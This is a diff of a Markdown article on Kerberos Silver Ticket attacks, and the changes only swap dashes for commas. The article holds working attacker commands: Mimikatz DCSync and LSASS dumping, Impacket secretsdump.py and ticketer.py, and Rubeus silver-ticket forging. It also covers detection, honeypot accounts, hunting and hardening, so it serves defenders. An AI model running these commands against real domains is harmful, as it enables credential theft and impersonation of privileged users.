@@ -18,13 +18,13 @@ featured: false
 
 ## Definition
 
-A Silver Ticket is a forged Kerberos Ticket Granting Service (TGS) ticket created using the NTLM hash (or AES keys) of a specific service account or computer account. Unlike a Golden Ticket (which uses the krbtgt hash), a Silver Ticket only grants access to one specific service — but it does so without any interaction with the KDC, making it almost invisible to DC-side monitoring.
+A Silver Ticket is a forged Kerberos Ticket Granting Service (TGS) ticket created using the NTLM hash (or AES keys) of a specific service account or computer account. Unlike a Golden Ticket (which uses the krbtgt hash), a Silver Ticket only grants access to one specific service, but it does so without any interaction with the KDC, making it almost invisible to DC-side monitoring.
 
 ---
 
-## PAC Internals — What Makes Forging Possible
+## PAC Internals, What Makes Forging Possible
 
-Every Kerberos service ticket contains a **Privilege Attribute Certificate (PAC)** — a Microsoft extension embedded in the encrypted portion of the ticket. The PAC contains:
+Every Kerberos service ticket contains a **Privilege Attribute Certificate (PAC)**, a Microsoft extension embedded in the encrypted portion of the ticket. The PAC contains:
 
 - The user's SID
 - The user's group memberships (as SIDs)
@@ -33,13 +33,13 @@ Every Kerberos service ticket contains a **Privilege Attribute Certificate (PAC)
   - **Server signature**: signed with the service account's key
   - **KDC signature**: signed with the krbtgt key
 
-In a normal ticket, both signatures are present and valid. The service validates the server signature (which it can, because it knows its own key). PAC validation against the KDC signature is **optional** — and disabled by default on many services.
+In a normal ticket, both signatures are present and valid. The service validates the server signature (which it can, because it knows its own key). PAC validation against the KDC signature is **optional**, and disabled by default on many services.
 
 When an attacker forges a TGS using the service account's hash, they can:
 - Write any username into the PAC (including non-existent accounts)
 - Write any group SIDs into the PAC (including Domain Admins RID 512)
 - Sign the server signature (they have the key)
-- **Leave the KDC signature invalid or absent** — the service won't check it unless PAC validation is explicitly enabled
+- **Leave the KDC signature invalid or absent**, the service won't check it unless PAC validation is explicitly enabled
 
 ---
 
@@ -50,17 +50,17 @@ When an attacker forges a TGS using the service account's hash, they can:
 | Target service account NTLM hash | LSASS dump, DCSync, NTDS.dit extraction |
 | Domain SID | `whoami /user`, `Get-ADDomain`, `wmic` |
 | Target SPN | `setspn -Q */*`, `Get-ADUser` |
-| Username to impersonate | Any string — real or fake |
+| Username to impersonate | Any string, real or fake |
 | Domain FQDN | Domain environment info |
 
 ---
 
 ## How an Attacker Performs This Attack
 
-### Step 1 — Obtain the Service Account Hash
+### Step 1, Obtain the Service Account Hash
 
 ```cmd
-# Mimikatz — DCSync for the service account
+# Mimikatz, DCSync for the service account
 privilege::debug
 lsadump::dcsync /user:svc_sql /domain:domain.local
 
@@ -69,7 +69,7 @@ sekurlsa::logonpasswords
 ```
 
 ```bash
-# Impacket — remote DCSync
+# Impacket, remote DCSync
 python3 secretsdump.py domain.local/DomainAdmin:password@dc01.domain.local \
   -just-dc-user svc_sql
 ```
@@ -81,7 +81,7 @@ For **computer accounts** (e.g., to forge a CIFS ticket for `fileserver$`):
 lsadump::dcsync /user:FILESERVER$
 ```
 
-### Step 2 — Get the Domain SID
+### Step 2, Get the Domain SID
 
 ```powershell
 # Multiple methods
@@ -90,10 +90,10 @@ whoami /user   # SID is S-1-5-21-XXXX-XXXX-XXXX-<RID>, strip the last part
 [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
 ```
 
-### Step 3 — Forge the Silver Ticket
+### Step 3, Forge the Silver Ticket
 
 ```cmd
-# Mimikatz — forge and inject in one step
+# Mimikatz, forge and inject in one step
 kerberos::golden \
   /user:FakeAdmin \
   /domain:domain.local \
@@ -114,7 +114,7 @@ kerberos::golden /user:FakeAdmin /domain:domain.local \
 ```
 
 ```powershell
-# Rubeus — Silver Ticket forging
+# Rubeus, Silver Ticket forging
 .\Rubeus.exe silver \
   /service:cifs/fileserver.domain.local \
   /rc4:NTLMHASH \
@@ -129,7 +129,7 @@ klist
 ```
 
 ```bash
-# Impacket — ticketer.py
+# Impacket, ticketer.py
 python3 ticketer.py \
   -nthash NTLMHASH \
   -domain-sid S-1-5-21-XXX-XXX-XXX \
@@ -158,9 +158,9 @@ python3 smbclient.py -k -no-pass fileserver.domain.local
 
 ## Security Problems
 
-**1. The KDC is completely bypassed.** DC security logs (4768, 4769, 4770) show nothing during a Silver Ticket attack — the ticket never touches the KDC after forging.
+**1. The KDC is completely bypassed.** DC security logs (4768, 4769, 4770) show nothing during a Silver Ticket attack, the ticket never touches the KDC after forging.
 
-**2. Impersonation of non-existent users.** The forged PAC can claim any identity. Services that do group-membership-based access control read the PAC — if it says Domain Admin, access is granted.
+**2. Impersonation of non-existent users.** The forged PAC can claim any identity. Services that do group-membership-based access control read the PAC, if it says Domain Admin, access is granted.
 
 **3. Unlimited persistence.** An attacker can set a 10-year validity window. The ticket will work until:
   - The service account password is changed (and all sessions expire)
@@ -168,7 +168,7 @@ python3 smbclient.py -k -no-pass fileserver.domain.local
 
 **4. Computer accounts are easy targets.** Every domain-joined workstation and server has a computer account with a locally stored machine account hash (in LSASS). Extracting it is straightforward with local admin rights.
 
-**5. Lateral movement without domain credentials.** If an attacker has local admin on a machine, they can extract that machine's computer account hash, forge a `cifs/machine` Silver Ticket for another target, and move laterally — never touching the DC.
+**5. Lateral movement without domain credentials.** If an attacker has local admin on a machine, they can extract that machine's computer account hash, forge a `cifs/machine` Silver Ticket for another target, and move laterally, never touching the DC.
 
 ---
 
@@ -247,7 +247,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4769 } |
 
 ## Honeypot Service Account Detection
 
-Create a service account with a registered SPN that is never legitimately accessed. Any TGS usage for this service is an immediate alert — if it bypasses the DC (Silver Ticket), detection depends on the target server's 4624 logs.
+Create a service account with a registered SPN that is never legitimately accessed. Any TGS usage for this service is an immediate alert, if it bypasses the DC (Silver Ticket), detection depends on the target server's 4624 logs.
 
 ```powershell
 # Honeypot service account
@@ -266,10 +266,10 @@ Set-ADUser svc_printlegacy -Add @{
 
 ## How to Hunt It (Post-Incident)
 
-### Phase 1 — Identify high-value service and computer account hashes at risk
+### Phase 1, Identify high-value service and computer account hashes at risk
 
 ```powershell
-# Service accounts with SPNs — Silver Ticket candidates
+# Service accounts with SPNs, Silver Ticket candidates
 Get-ADUser -Filter { ServicePrincipalName -ne "$null" } `
   -Properties ServicePrincipalName, PasswordLastSet |
   Select-Object SamAccountName, PasswordLastSet,
@@ -280,15 +280,15 @@ Get-ADUser -Filter { ServicePrincipalName -ne "$null" } `
     @{ n = 'SPN'; e = { $_.ServicePrincipalName -join ' | ' } } |
   Sort-Object PasswordAgeDays -Descending
 
-# Computer accounts — CIFS/HOST Silver Ticket candidates
+# Computer accounts, CIFS/HOST Silver Ticket candidates
 Get-ADComputer -Filter * -Properties PasswordLastSet |
   Where-Object { $_.PasswordLastSet -lt (Get-Date).AddDays(-60) } |
   Select-Object Name, PasswordLastSet
 ```
 
-### Phase 2 — Hunt for logons with no DC 4769 precursor
+### Phase 2, Hunt for logons with no DC 4769 precursor
 
-This requires correlating logs from target servers with DC logs — manual or SIEM-assisted:
+This requires correlating logs from target servers with DC logs, manual or SIEM-assisted:
 
 ```powershell
 # On each target server: extract Kerberos logon events with user + timestamp
@@ -310,7 +310,7 @@ $srvLogons | Export-Csv "C:\Temp\srv_kerberos_logons.csv" -NoTypeInformation
 
 ### 1. gMSA for All Service Accounts
 
-gMSA accounts have 240-character auto-rotating passwords. Silver Ticket forging requires the service account hash — gMSA hashes are computationally impossible to crack, and the password rotates regularly.
+gMSA accounts have 240-character auto-rotating passwords. Silver Ticket forging requires the service account hash, gMSA hashes are computationally impossible to crack, and the password rotates regularly.
 
 ```powershell
 New-ADServiceAccount -Name "gmsa_sql" `
@@ -326,7 +326,7 @@ New-ADServiceAccount -Name "gmsa_sql" `
 Set-ADUser svc_iis -Replace @{ 'msDS-SupportedEncryptionTypes' = 24 }  # AES128+AES256
 ```
 
-Attackers need the AES keys (not just the NTLM hash) to forge AES tickets. AES keys require AES-encrypted secrets from DCSync — a higher bar.
+Attackers need the AES keys (not just the NTLM hash) to forge AES tickets. AES keys require AES-encrypted secrets from DCSync, a higher bar.
 
 ### 3. Machine Account Password Rotation
 
@@ -363,4 +363,4 @@ Get-ADComputer -Filter * -Properties PasswordLastSet, Enabled |
 
 ## Conclusion
 
-Silver Tickets are surgically precise — one ticket, one service, no DC contact. Their power lies in what they bypass: all DC-side Kerberos logging. Countermeasures must operate at the service level (PAC validation, host-based 4624 monitoring) and at the credential level (gMSA eliminates the forgeable hash entirely). If you can answer "who authenticated to this service in the last 24 hours without a matching DC-issued ticket?", you have functional Silver Ticket detection.
+Silver Tickets are surgically precise, one ticket, one service, no DC contact. Their power lies in what they bypass: all DC-side Kerberos logging. Countermeasures must operate at the service level (PAC validation, host-based 4624 monitoring) and at the credential level (gMSA eliminates the forgeable hash entirely). If you can answer "who authenticated to this service in the last 24 hours without a matching DC-issued ticket?", you have functional Silver Ticket detection.
